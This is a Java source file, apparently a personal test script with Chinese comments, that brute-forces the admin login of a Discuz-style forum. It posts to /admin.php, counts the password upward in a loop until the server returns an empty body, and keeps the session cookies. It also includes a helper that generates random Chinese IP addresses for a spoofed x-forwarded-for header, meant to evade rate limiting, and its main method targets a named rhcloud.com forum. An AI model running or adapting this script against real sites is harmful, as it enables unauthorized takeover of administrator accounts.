package test;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.httpclient.Cookie;
import org.apache.commons.httpclient.Header;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpException;
import org.apache.commons.httpclient.NameValuePair;
import org.apache.commons.httpclient.UsernamePasswordCredentials;
import org.apache.commons.httpclient.auth.AuthScope;
import org.apache.commons.httpclient.cookie.CookiePolicy;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.params.DefaultHttpParams;
import org.apache.commons.httpclient.params.HttpMethodParams;

public class DZ {

/**
* @param args
*/

private Boolean isProxy;

public DZ(Boolean isProxy) {
this.isProxy = isProxy;
}

// 设置只是输出错误信息*****************begin*******************
static {
System.setProperty("org.apache.commons.logging.Log",
"org.apache.commons.logging.impl.SimpleLog");
System.setProperty("org.apache.commons.logging.simplelog.showdatetime",
"true");
System.setProperty("org.apache.commons.logging"
+ ".simplelog.log.org.apache.commons.httpclient", "error");
}

public void loginBbs(String bbsUrl, String userName, String userPassword,String fid) {
HttpClient httpClient = new HttpClient();// 定义一个客户端

List

headers = new ArrayList
();
headers.add(new Header("User-Agent",
"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1)"));
httpClient.getHostConfiguration().getParams().setParameter(
"http.default-headers", headers);
// 设置 HttpClient 接收 Cookie,用与浏览器一样的策略
httpClient.getParams().setCookiePolicy(
CookiePolicy.BROWSER_COMPATIBILITY);
// 解决cookie报错信息
DefaultHttpParams.getDefaultParams().setParameter(
"http.protocol.cookie-policy",
CookiePolicy.BROWSER_COMPATIBILITY);

System.out.println("—————–这是模拟登陆论坛的代码———————");
// 链接超时
httpClient.getHttpConnectionManager().getParams().setConnectionTimeout(
10000);
// 读取超时
httpClient.getHttpConnectionManager().getParams().setSoTimeout(18000);

if (isProxy) {
httpClient.getHostConfiguration().setProxy(bbsUrl, 80);
UsernamePasswordCredentials creds = new UsernamePasswordCredentials(
"xxxxx", "00000");
httpClient.getState().setProxyCredentials(AuthScope.ANY, creds);
}

// 开始准备数据进行登陆————————–开始
//PostMethod postMethod = new PostMethod(bbsUrl + "/member.php");// 设置一个post请求
PostMethod postMethod = new PostMethod(bbsUrl + "/admin.php");// 设置一个post请求
HttpMethodParams params = postMethod.getParams();
params.setContentCharset("UTF-8"); // 设置编码
List nameValues = new ArrayList();// 设置参数列表
/*
nameValues.add(new NameValuePair("mod", "logging"));
nameValues.add(new NameValuePair("action", "login"));
nameValues.add(new NameValuePair("loginsubmit", "yes"));
nameValues.add(new NameValuePair("infloat", "yes"));
nameValues.add(new NameValuePair("lssubmit", "yes"));
nameValues.add(new NameValuePair("fastloginfield", "username"));
nameValues.add(new NameValuePair("username", userName));
nameValues.add(new NameValuePair("password", userPassword));
nameValues.add(new NameValuePair("cookietime", "2592000"));
*/

String returnBody ="afdaf";

// 开始准备数据进行登陆————————–结束

try {


//System.out.println("ss"+returnBody);

int i=1;

int password=Integer.parseInt(userPassword);

while(!"".equals(returnBody)) {
	nameValues.clear();
	userPassword=String.valueOf(password);	
	nameValues.add(new NameValuePair("admin_username", userName));
	nameValues.add(new NameValuePair("admin_password", userPassword));
	nameValues.add(new NameValuePair("cookietime", "2592000"));
	nameValues.add(new NameValuePair("quickforward", "yes"));
	nameValues.add(new NameValuePair("handlekey", "ls"));

	System.out.println("namevalues="+nameValues);
	
	postMethod.setRequestBody((NameValuePair[]) nameValues.toArray(new NameValuePair[nameValues.size()]));// 添加参数列表
	
	String s = getRandomIp();  
   // postMethod.setRequestHeader("x-forwarded-for",s);  
    System.out.println("s="+s);  
	
	httpClient.executeMethod(postMethod);
	returnBody = postMethod.getResponseBodyAsString();
	
	if (!returnBody.equals("")) {
	System.out.println("登陆失败"+i+" password="+password);
	System.out.println("提示信息是：" + returnBody);
	}
	if ("".equals(returnBody)) {
		System.out.println("登陆成功");
		System.out.println("提示信息是：" + returnBody);
	}
	password++;
    i++;	
} 


//获得登陆后的 Cookie
Cookie[] cookies = httpClient.getState().getCookies();
String tmpcookies = "";
for (Cookie c : cookies) {
tmpcookies += c.toString() + ";";
System.out.println("cookies="+tmpcookies);
}

} catch (HttpException e) {
e.printStackTrace();
} catch (IOException e) {

e.printStackTrace();
}
}

public static void main(String[] args) {
new DZ(false).loginBbs("http://zend-pongyou.rhcloud.com/bbs","admin","123","36");
}


public static String getRandomIp(){  
    
    //ip范围  
    int[][] range = {{607649792,608174079},//36.56.0.0-36.63.255.255  
                     {1038614528,1039007743},//61.232.0.0-61.237.255.255  
                     {1783627776,1784676351},//106.80.0.0-106.95.255.255  
                     {2035023872,2035154943},//121.76.0.0-121.77.255.255  
                     {2078801920,2079064063},//123.232.0.0-123.235.255.255  
                     {-1950089216,-1948778497},//139.196.0.0-139.215.255.255  
                     {-1425539072,-1425014785},//171.8.0.0-171.15.255.255  
                     {-1236271104,-1235419137},//182.80.0.0-182.92.255.255  
                     {-770113536,-768606209},//210.25.0.0-210.47.255.255  
                     {-569376768,-564133889}, //222.16.0.0-222.95.255.255  
    };  
       
    Random rdint = new Random();  
    int index = rdint.nextInt(10);  
    String ip = num2ip(range[index][0]+new Random().nextInt(range[index][1]-range[index][0]));  
    return ip;  
} 


public static String num2ip(int ip) {  
    int [] b=new int[4] ;  
    String x = "";  
       
    b[0] = (int)((ip >> 24) & 0xff);  
    b[1] = (int)((ip >> 16) & 0xff);  
    b[2] = (int)((ip >> 8) & 0xff);  
    b[3] = (int)(ip & 0xff);  
    x=Integer.toString(b[0])+"."+Integer.toString(b[1])+"."+Integer.toString(b[2])+"."+Integer.toString(b[3]);   
       
    return x;   
 }  

}
